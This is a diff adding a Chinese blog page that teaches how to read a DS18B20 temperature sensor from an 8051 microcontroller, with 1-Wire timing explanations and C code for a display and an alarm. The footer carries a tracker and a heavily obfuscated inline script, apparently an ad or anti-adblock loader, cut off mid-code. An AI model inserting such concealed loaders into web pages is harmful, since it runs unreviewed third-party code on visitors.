@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>51单片机DS18B20温度传感器 - 编程随想</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="51单片机DS18B20温度传感器" />
+<meta property="og:description" content="DS18B20 介绍 DS18B20是一种常见的数字温度传感器，其控制命令和数据都是以数字信号的方式输入输出，相比较于模拟温度传感器，具有功能强大、硬件简单、易扩展、抗干扰性强等特点，其测温范围大约在-55°C 到 &#43;125°C之间，它的通信接口是1-Wire（单总线），其它特征有可形成总线结构、内置温度报警功能、可寄生供电（可寄生供电即无需接VCC，只需要接数据线与GND即可完成数据通信，节省线路）
+关于温度的测量，我们可以用温度传感器或者数字温度传感器，但是数字温度传感器总体会比温度传感器的精度要高一些。
+本单片机的DS18B20无需设计电路，只需要通过引脚与单总线通信协议，将RAM里面的温度转化读取出来即可，因此我就不在说明里面的电路构造了
+存储器 TEMPERATURE SENSOR（温度传感器）相当于内部的模拟传感器集成部分。
+当发出指令让其开始温度转换时，该部分就开始工作，并将数据放入RAM中。
+ALARM HIGH TRIGGER REGISTER（TH，报警高触发器）用于存储温度上限阈值，实现温度报警。
+存储介质为EEPROM，掉电不丢失数据。
+ALARM LOW TRIGGER REGISTER（TL，报警低触发器）用于存储温度下限阈值，实现温度报警。
+存储介质为EEPROM，掉电不丢失数据。
+CONFIGURATION REGISTER（配置寄存器）用于设置分辨率（精度）
+——这里出厂默认最高精度为0.0625℃。
+可以通过配置寄存器中两位（其他位无效）来降低精度，最低为0.5℃。
+当精度降低时，温度转换速率会迅速提升。（相当于处理的数据少了，流程简化，速度就上去了）
+存储介质为EEPROM，掉电不丢失数据。
+8-BIT CRC GENERATOR（8位CRC生成器）中CRC为校验码，该部分将RAM之前的数据进行校验，并生成一个校验码放于后端，通讯时检测即可判断数据是否正确。（CRC为校正率较高的一种校验码）
+温度存储部分：
+Byte 0存储的是温度的最低有效字节，括号内为默认值。
+Byte1存储的是温度的最高有效字节，括号内为默认值。
+两个字节共同组成温度值，在未变动情况下，默认值为85℃。（不同单片机默认值不一样）
+配置温度数据部分：
+Byte 2存储为温度上限阈值，Byte 3存储为温度下限阈值，Byte 4存储为精度（分辨率）。
+右边的EEPROM负责存储数据，需要读取与写入数据要先经过RAM部分，然后通过指令将数据存储进EEPROM中（当上电时，EEPROM的数据会自动放入RAM中）
+Byte 5~Byte 7为保留部分，说白了，就是没有任何用处，只不过为了以后的功能添加而预留的位置。
+CRC校验部分：
+将前面八个字节进行运算，并生成CRC校验码。
+可以读取CRC校验码，并对前面八个字节数据进行运算，如果运算结果与CRC相同，那么校验正确，反之数据出错。
+单总线时序结构 初始化 由于这是单总线，所以数据传送的时间一定要严格
+图中黑粗线Bus master pulling low（主机拉低）是将总线拉低；而图中黑细线Resistor pullup为上拉电阻将总线上拉（因为是弱上拉，所以利用曲线来表示弱的状态，而不是强上拉一下拉上去）
+当从机存在时，从机会将总线拉低（即图中棕线DS18B20 pulling low）。最终上拉电阻拉高，总线恢复空闲状态。由于中间的操作间隔时间是范围值，没有确切的参考数据，于是取中间值来作为等待间隔时间，对于以上的操作，可以将过程分为复位与响应两个部分
+发送一位 我们可以将上面的部分分为发送0与发送1两部分的时序。换句话说，就是通过时间的不同来区分数据是输入1还是0.
+发送0时，拉低超过60us且不能超过120us，否则如果超过120us时，可能会变为初始化操作（至少480us），两个数据发送中间存在总线恢复时间，因此连续发送两位不能低于这个恢复时间。
+图中阴影部分，表示可以在1~15us时释放总线即可，这时电阻都会将总线拉高。
+从机在主线拉低30us后进行操作（如果发送0，就一直保持总线拉低；如果发送1，就在主线拉低后，将总线释放），这样就可以很清楚的确认要发送的数据了。若在主线拉低15us后进行操作，就有可能会出现一些数据传输的偏差，因为发送1的时序在15us时，正处于主线拉高的状态，我们无法准确的判断此时是否已经完成拉高的操作，因此在30us后进行最合适。
+接收一位 当主机拉低总线后，从机如果需要发0，那么也拉低总线，当主机在1~15us后释放总线时，因为从机拉低着，因此总线状态为拉低状态。
+当主机拉低总线后，从机如果需要发1，那么就不动总线。当主机经过1~15us后释放总线时，因为没有被拉低，因此总线状态为拉高状态。在总机拉低后15us内读取总线电平（I/O口），即可知道从机需要发送的数据。
+发送与接收一个字节 DS18B20操作 首先，我们需要将DS18B20进行初始化，让从机复位，主机判断从机是否响应" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/620a8753db36d9e8557faf7aa5777191/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-12-29T17:10:29+08:00" />
+<meta property="article:modified_time" content="2022-12-29T17:10:29+08:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程随想" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程随想</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">51单片机DS18B20温度传感器</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <h2>DS18B20</h2> 
+<h3>介绍</h3> 
+<p>DS18B20是一种常见的数字温度传感器，其控制命令和数据都是以数字信号的方式输入输出，相比较于模拟温度传感器，具有功能强大、硬件简单、易扩展、抗干扰性强等特点，其测温范围大约在-55°C 到 +125°C之间，它的通信接口是1-Wire（单总线），其它特征有可形成总线结构、内置温度报警功能、可寄生供电（可寄生供电即无需接VCC，只需要接数据线与GND即可完成数据通信，节省线路）</p> 
+<p>关于温度的测量，我们可以用温度传感器或者数字温度传感器，但是数字温度传感器总体会比温度传感器的精度要高一些。</p> 
+<p><img alt="" height="408" src="https://images2.imgbox.com/e9/8b/0IzzHjUt_o.png" width="317"></p> 
+<p>本单片机的DS18B20无需设计电路，只需要通过引脚与单总线通信协议，将RAM里面的温度转化读取出来即可，因此我就不在说明里面的电路构造了</p> 
+<h3>存储器</h3> 
+<p><img alt="" height="378" src="https://images2.imgbox.com/cf/72/Spm6CUUg_o.png" width="391"></p> 
+<p>TEMPERATURE SENSOR（温度传感器）相当于内部的模拟传感器集成部分。</p> 
+<p>当发出指令让其开始温度转换时，该部分就开始工作，并将数据放入RAM中。</p> 
+<p>ALARM HIGH TRIGGER REGISTER（TH，报警高触发器）用于存储温度上限阈值，实现温度报警。</p> 
+<p>存储介质为EEPROM，掉电不丢失数据。</p> 
+<p>ALARM LOW TRIGGER REGISTER（TL，报警低触发器）用于存储温度下限阈值，实现温度报警。</p> 
+<p>存储介质为EEPROM，掉电不丢失数据。</p> 
+<p>CONFIGURATION REGISTER（配置寄存器）用于设置分辨率（精度）</p> 
+<p>——这里出厂默认最高精度为0.0625℃。</p> 
+<p>可以通过配置寄存器中两位（其他位无效）来降低精度，最低为0.5℃。</p> 
+<p>当精度降低时，温度转换速率会迅速提升。（相当于处理的数据少了，流程简化，速度就上去了）</p> 
+<p>存储介质为EEPROM，掉电不丢失数据。</p> 
+<p>8-BIT CRC GENERATOR（8位CRC生成器）中CRC为校验码，该部分将RAM之前的数据进行校验，并生成一个校验码放于后端，通讯时检测即可判断数据是否正确。（CRC为校正率较高的一种校验码）</p> 
+<p><img alt="" height="424" src="https://images2.imgbox.com/2b/37/uhYqWeBR_o.png" width="774"></p> 
+<p>温度存储部分：</p> 
+<p>Byte 0存储的是温度的最低有效字节，括号内为默认值。</p> 
+<p>Byte1存储的是温度的最高有效字节，括号内为默认值。</p> 
+<p>两个字节共同组成温度值，在未变动情况下，默认值为85℃。（不同单片机默认值不一样）</p> 
+<p>配置温度数据部分：</p> 
+<p>Byte 2存储为温度上限阈值，Byte 3存储为温度下限阈值，Byte 4存储为精度（分辨率）。</p> 
+<p>右边的EEPROM负责存储数据，需要读取与写入数据要先经过RAM部分，然后通过指令将数据存储进EEPROM中（当上电时，EEPROM的数据会自动放入RAM中）</p> 
+<p></p> 
+<p>Byte 5~Byte 7为保留部分，说白了，就是没有任何用处，只不过为了以后的功能添加而预留的位置。</p> 
+<p></p> 
+<p>CRC校验部分：</p> 
+<p>将前面八个字节进行运算，并生成CRC校验码。</p> 
+<p>可以读取CRC校验码，并对前面八个字节数据进行运算，如果运算结果与CRC相同，那么校验正确，反之数据出错。</p> 
+<h2>单总线时序结构</h2> 
+<h3>初始化</h3> 
+<p><img alt="" height="396" src="https://images2.imgbox.com/36/8c/D6dXWjhC_o.png" width="780"></p> 
+<p>由于这是单总线，所以数据传送的时间一定要严格</p> 
+<p>图中黑粗线Bus master pulling low（主机拉低）是将总线拉低；而图中黑细线Resistor pullup为上拉电阻将总线上拉（因为是弱上拉，所以利用曲线来表示弱的状态，而不是强上拉一下拉上去）</p> 
+<p>当从机存在时，从机会将总线拉低（即图中棕线DS18B20 pulling low）。最终上拉电阻拉高，总线恢复空闲状态。由于中间的操作间隔时间是范围值，没有确切的参考数据，于是取中间值来作为等待间隔时间，对于以上的操作，可以将过程分为复位与响应两个部分</p> 
+<h3>发送一位</h3> 
+<p><img alt="" height="406" src="https://images2.imgbox.com/17/cb/IjaWz2Jz_o.png" width="781"></p> 
+<p>我们可以将上面的部分分为发送0与发送1两部分的时序。换句话说，就是通过时间的不同来区分数据是输入1还是0.</p> 
+<p>发送0时，拉低超过60us且不能超过120us，否则如果超过120us时，可能会变为初始化操作（至少480us），两个数据发送中间存在总线恢复时间，因此连续发送两位不能低于这个恢复时间。</p> 
+<p>图中阴影部分，表示可以在1~15us时释放总线即可，这时电阻都会将总线拉高。</p> 
+<p>从机在主线拉低30us后进行操作（如果发送0，就一直保持总线拉低；如果发送1，就在主线拉低后，将总线释放），这样就可以很清楚的确认要发送的数据了。若在主线拉低15us后进行操作，就有可能会出现一些数据传输的偏差，因为发送1的时序在15us时，正处于主线拉高的状态，我们无法准确的判断此时是否已经完成拉高的操作，因此在30us后进行最合适。</p> 
+<h3>接收一位</h3> 
+<p><img alt="" height="398" src="https://images2.imgbox.com/5e/ad/MtB1nC6g_o.png" width="783"></p> 
+<p>当主机拉低总线后，从机如果需要发0，那么也拉低总线，当主机在1~15us后释放总线时，因为从机拉低着，因此总线状态为拉低状态。</p> 
+<p>当主机拉低总线后，从机如果需要发1，那么就不动总线。当主机经过1~15us后释放总线时，因为没有被拉低，因此总线状态为拉高状态。在总机拉低后15us内读取总线电平（I/O口），即可知道从机需要发送的数据。</p> 
+<h3> 发送与接收一个字节</h3> 
+<p><img alt="" height="166" src="https://images2.imgbox.com/46/c3/yJ3t5Ant_o.png" width="783"></p> 
+<p><img alt="" height="178" src="https://images2.imgbox.com/89/f6/a1yxor3r_o.png" width="781"> </p> 
+<h2>DS18B20操作</h2> 
+<p>首先，我们需要将DS18B20进行初始化，让从机复位，主机判断从机是否响应</p> 
+<p>然后，就是ROM的操作和功能指令的操作</p> 
+<p><img alt="" height="272" src="https://images2.imgbox.com/a9/36/yleMEg9Y_o.png" width="799"></p> 
+<h4>ROM </h4> 
+<p>对于ROM的操作，就是ROM指令+本指令需要的读写操作</p> 
+<p>SEARCH ROM就是表面意思，搜索ROM。</p> 
+<p>READ ROM就是读取ROM：先调用读取指令，再调用读取时序（接收部分），就可以将ROM读取出来。</p> 
+<p>MATCH ROM就是匹配ROM：先发送匹配指令，然后发送ROM地址，实现利用该指令匹配与哪个设备进行通信的效果。</p> 
+<p>SKIP ROM就是跳过ROM：调用跳过指令，直接将ROM部分跳过进入下一部分。但是，要注意的是，当总线上只有一个设备时使用。多个设备挂载时，使用这个指令会产生混乱，无法确定是哪个设备</p> 
+<p>ALARM SEARCH就是报警搜索：当挂载多个设备的情况下，某个设备温度超过设定温度阈值时，会产生报警，利用这个指令即可快速搜索出超过温度阈值的设备。</p> 
+<h4> 功能指令</h4> 
+<p>CONVERT T（温度变换）：调用该指令时，温度传感器部分会将温度数据的模拟信号转化为数字信号，并将数据放在RAM中，从而达到RAM里面的温度数据与外界温度几乎同步的状态。</p> 
+<p>WRITE SCRATCHPAD（写暂存器）：调用该指令后，再接着写入时序（发送一个字节部分），那么该字节就会被写入RAM中的配置温度数据部分。</p> 
+<p>READ SCRATCHPAD（读暂存器）：调用该指令后，再接着接收时序（接收一个字节部分部分），那么DS18B20就会依次将RAM里面内容读取出来（直到CRC）。至于代码的实现只需要读取前两个字节（温度数据）即可。</p> 
+<p>COPY SCRATCHPAD（复制暂存器）：调用该指令后，DS18B20就会把RAM中配置温度数据部分写入EEPROM中（实现掉电不丢失）。</p> 
+<p>RECALL E2（重调E2暂存器）：调用该指令后，DS18B20就会把EEPROM中数据放入RAM中（覆盖之前的数据）。</p> 
+<p>READ POWER SUPPLY（读取设备供电模式）：调用该指令后，紧跟着读取一位时序（接收一位字节部分），就会返回当前供电状态（独立供电或寄生供电），因为进行操作（如数据变换）时，需要高电能补充；因此在寄生供电状态下，需要调强上拉模式；如果在独立供电时，就不需要调；</p> 
+<p></p> 
+<h4>DS18B20数据帧</h4> 
+<p><img alt="" height="173" src="https://images2.imgbox.com/13/3e/wZBh9uRk_o.png" width="787"></p> 
+<p></p> 
+<p><img alt="" height="210" src="https://images2.imgbox.com/ca/46/BDTmq8G7_o.png" width="788"> </p> 
+<p>以上是温度变换与读取的相关操作。</p> 
+<p></p> 
+<h4> 温度存储的原理</h4> 
+<p><img alt="" height="433" src="https://images2.imgbox.com/f4/b7/Qlci9CVO_o.png" width="787"></p> 
+<p>这里的小数部分依靠二分法的机制进行补位，最小分度为0.0625，即每次数据加一，即温度增加0.0625℃。这里数据的存储方式以二进制补码的形式存储。即正数保持不变，负数则将对应的正数每个位取反，最后加一。</p> 
+<h2>代码</h2> 
+<h3>温度读取代码</h3> 
+<h4>主函数代码</h4> 
+<pre><code class="language-cpp">#include &lt;REGX52.H&gt;
+#include "Delay.h"
+#include "LCD1602.h"
+#include "OneWire.h"
+#include "DS18B20.h"
+
+
+float T;
+
+void main()
+{
+	LCD_Init();
+	LCD_ShowString(1,1,"Temperature:");
+	while(1)
+	{
+		DS18B20_ConverT();
+		T=DS18B20_ReadT();
+		if(T&lt;0)
+		{
+			LCD_ShowChar(2,1,'-');
+			T=-T;
+		}
+		else
+		{
+			LCD_ShowChar(2,1,'+');
+		}
+		LCD_ShowNum(2,2,T,3);
+		LCD_ShowChar(2,5,'.');
+		LCD_ShowNum(2,6,(unsigned long)(T*10000)%10000,4);//这样便可以将小数部分进行显示了
+	}
+}</code></pre> 
+<h4> 部分模块代码</h4> 
+<pre><code class="language-cpp">#include &lt;REGX52.H&gt;
+
+
+sbit OneWire_DQ=P3^7;
+
+
+
+/**
+  * @brief  单总线初始化
+  * @param  无
+  * @retval 从机响应位，0为响应，1为未响应
+  */
+unsigned char OneWire_Init(void)
+{
+	unsigned char i;
+	unsigned char AckBit;
+	OneWire_DQ=1;
+	OneWire_DQ=0;
+	i = 247;while (--i);		//Delay  500us
+	OneWire_DQ=1;
+	i = 32;while (--i);		//Delay  70us
+	AckBit=OneWire_DQ;
+	i = 247;while (--i);		//Delay  500us
+	return AckBit;
+}
+
+
+/**
+  * @brief  单总线发送一位
+  * @param  Bit 要发送的位
+  * @retval 无
+  */
+void OneWire_SendBit(unsigned char Bit)
+{
+	
+	unsigned char i;
+	OneWire_DQ=0;
+	i = 4;while (--i);		//Delay  10us
+	OneWire_DQ=Bit;
+	i = 24;while (--i);		//Delay  50us
+	OneWire_DQ=1;
+}
+
+
+/**
+  * @brief  单总线接收一位
+  * @param  无
+  * @retval 读取的位
+  */
+unsigned char OneWire_ReceiveBit(void)
+{
+	unsigned char i;
+	unsigned char Bit;
+	OneWire_DQ=0;
+	i = 2;while (--i);		//Delay  5us
+	OneWire_DQ=1;
+	i = 2;while (--i);		//Delay  5us
+	Bit=OneWire_DQ;
+	i = 24;while (--i);		//Delay  50us
+	
+	
+	return Bit;
+}
+
+
+/**
+  * @brief  单总线发送一个字节
+  * @param  Byte 要发送的字节
+  * @retval 无
+  */
+void OneWire_SendByte(unsigned char Byte)
+{
+	unsigned char i;
+	for(i=0;i&lt;8;i++)
+	{
+		OneWire_SendBit(Byte&amp;0x01&lt;&lt;i);
+	}
+}
+
+
+/**
+  * @brief  单总线接收一个字节
+  * @param  无
+  * @retval 接收的一个字节
+  */
+unsigned char OneWire_ReceiveByte(void)
+{
+	unsigned char i;
+	unsigned char Byte=0x00;
+	for(i=0;i&lt;8;i++)
+	{
+		if(OneWire_ReceiveBit()){Byte|=(0x01&lt;&lt;i);}
+	}
+	
+	
+	return Byte;
+}
+</code></pre> 
+<p> </p> 
+<pre><code class="language-cpp">#include &lt;REGX52.H&gt;
+#include "OneWire.h"
+#include "LCD1602.h"
+
+#define DS18B20_SKIP_ROM			0xCC
+#define DS18B20_CONVERT_T			0x44
+#define DS18B20_READ_SCARTCHPAD		0xBE
+
+
+
+/**
+  * @brief  DS18B20开始温度变换
+  * @param  无
+  * @retval 无
+  */
+void DS18B20_ConverT(void)
+{
+	OneWire_Init();
+	OneWire_SendByte(DS18B20_SKIP_ROM);
+	OneWire_SendByte(DS18B20_CONVERT_T);
+}
+	
+
+
+/**
+  * @brief  DS18B20读取温度
+  * @param  无
+  * @retval 温度数值
+  */
+float DS18B20_ReadT(void)
+{
+	unsigned char TLSB,TMSB;
+	int Temp;
+	float T;
+	OneWire_Init();
+	OneWire_SendByte(DS18B20_SKIP_ROM);
+	OneWire_SendByte(DS18B20_READ_SCARTCHPAD);
+	TLSB=OneWire_ReceiveByte();
+	TMSB=OneWire_ReceiveByte();
+	Temp=(TMSB&lt;&lt;8)|TLSB;
+	T=Temp/16.0;
+	return T;
+}</code></pre> 
+<h3>温度警报器代码</h3> 
+<h4>主函数代码</h4> 
+<pre><code class="language-cpp">#include &lt;REGX52.H&gt;
+#include "AT24C02.h"
+#include "Delay.h"
+#include "I2C.h"
+#include "LCD1602.h"
+#include "Key.h"
+#include "DS18B20.h"
+#include "OneWire.h"
+#include "Timer0.h"
+
+
+float T,TShow;
+char TLow,THigh;		//定义温度上限与下限阈值
+unsigned char KeyNum;
+
+void main()
+{
+	DS18B20_ConverT();		//使得温度数据不是默认值
+	Delay(1000);
+	THigh=AT24C02_ReadByte(0);		//读取掉电前的数据
+	TLow=AT24C02_ReadByte(1);
+	if(THigh&gt;125||TLow&lt;-55||THigh&lt;=TLow)
+	{
+		THigh=20;
+		TLow=15;
+	}
+	LCD_Init();
+	LCD_ShowString(1,1,"T:");
+	LCD_ShowString(2,1,"TH:");
+	LCD_ShowString(2,9,"TL:");
+	LCD_ShowSignedNum(2,4,THigh,3);		//上限阈值
+	LCD_ShowSignedNum(2,12,TLow,3);		//下限阈值
+	Timer0_Init();
+	while(1)
+	{
+		
+		KeyNum=Key();
+		/*温度读取及显示*/
+		DS18B20_ConverT();
+		T=DS18B20_ReadT();
+		if(T&lt;0)
+		{
+			LCD_ShowChar(1,3,'-');
+			TShow=-T;
+		}
+		else
+		{
+			LCD_ShowChar(1,3,'+');
+			TShow=T;
+		}
+		LCD_ShowNum(1,4,TShow,3);
+		LCD_ShowChar(1,7,'.');
+		LCD_ShowNum(1,8,(unsigned long)(TShow*100)%100,2);
+		/*阈值判断及显示*/
+		if(KeyNum)		//在按键按下时才进行检查，减少扫描时间
+		{
+			if(KeyNum==1)
+			{
+				THigh++;
+				if(THigh&gt;125){THigh=125;}
+			}
+			if(KeyNum==2)
+			{
+				THigh--;
+				if(THigh&lt;=TLow){THigh++;}
+			}
+			if(KeyNum==3)
+			{
+				TLow++;
+				if(TLow&gt;=THigh){TLow--;}
+			}
+			if(KeyNum==4)
+			{
+				TLow--;
+				if(TLow&lt;-55){TLow=-55;}
+			}
+			LCD_ShowSignedNum(2,4,THigh,3);
+			LCD_ShowSignedNum(2,12,TLow,3);	
+			AT24C02_WriteByte(0,THigh);		//保存上限下限的阈值数据
+			Delay(5);
+			AT24C02_WriteByte(1,TLow);
+			Delay(5);
+			
+		}
+		if(T&gt;THigh)
+		{
+			LCD_ShowString(1,13,"OV:H");
+		}
+		else if(T&lt;TLow)
+		{
+			LCD_ShowString(1,13,"OV:L");
+		}
+		else
+		{
+			LCD_ShowString(1,13,"    ");
+		}
+		
+		
+	}
+}
+
+
+void Timer0_Routine()  interrupt 1
+{
+	static unsigned int T0Count;
+	TL0 = 0x18;		//设置定时初值
+	TH0 = 0xFC;		//设置定时初值
+	T0Count++;
+	if(T0Count&gt;=20)
+	{
+		T0Count=0;
+		Key_Loop();		//在较短的时间内不断判断按键的状态
+	}
+	
+}</code></pre> 
+<h4>部分模块代码</h4> 
+<pre><code class="language-cpp">#include &lt;REGX52.H&gt;
+#include "Delay.h"
+
+
+unsigned char Key_KeyNumber;
+
+unsigned char Key(void)
+{
+	unsigned char Temp=0;
+	Temp=Key_KeyNumber;
+	Key_KeyNumber=0;
+	return Temp;
+}
+
+unsigned char Key_GetState()
+{
+	unsigned char KeyNumber=0;
+	if(P3_1==0){KeyNumber=1;}
+	if(P3_0==0){KeyNumber=2;}
+	if(P3_2==0){KeyNumber=3;}
+	if(P3_3==0){KeyNumber=4;}
+	
+	return KeyNumber;
+}
+
+
+void Key_Loop(void)
+{
+	static unsigned char NowState,LastState;
+	LastState=NowState;			//由于按键按下时的前后状态会不同，就可以用判断的方法去确定是否按下按键
+	NowState=Key_GetState();		//这样做就可以避免调入死循环中
+	if(LastState==1&amp;&amp;NowState==0)
+	{
+		Key_KeyNumber=1;
+	}
+	if(LastState==2&amp;&amp;NowState==0)
+	{
+		Key_KeyNumber=2;
+	}
+	if(LastState==3&amp;&amp;NowState==0)
+	{
+		Key_KeyNumber=3;
+	}
+	if(LastState==4&amp;&amp;NowState==0)
+	{
+		Key_KeyNumber=4;
+	}
+}
+</code></pre> 
+<pre><code class="language-cpp">unsigned char OneWire_Init(void)
+{
+	unsigned char i;
+	unsigned char AckBit;
+	EA=0;		//关闭定时器0
+	OneWire_DQ=1;
+	OneWire_DQ=0;
+	i = 247;while (--i);		//Delay  500us
+	OneWire_DQ=1;
+	i = 32;while (--i);		//Delay  70us
+	AckBit=OneWire_DQ;
+	i = 247;while (--i);		//Delay  500us
+	EA=1;		//打开定时器0
+	return AckBit;
+}
+
+
+void OneWire_SendBit(unsigned char Bit)
+{
+	
+	unsigned char i;
+	EA=0;		//关闭定时器0
+	OneWire_DQ=0;
+	i = 4;while (--i);		//Delay  10us
+	OneWire_DQ=Bit;
+	i = 24;while (--i);		//Delay  50us
+	OneWire_DQ=1;
+	EA=1;		//打开定时器0
+}</code></pre> 
+<p></p> 
+<p></p> 
+<p></p> 
+<p></p>
+                </div>
+		</div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/968d0298b00b14ff655b7dea171d442b/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Seata使用教程</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/948d9328bfab11eb6edc96324fd9d6ff/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">关于51单片机的地址空间溢出以及解决方法的个人看法(proteus无法仿真)</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程随想.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+
+<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x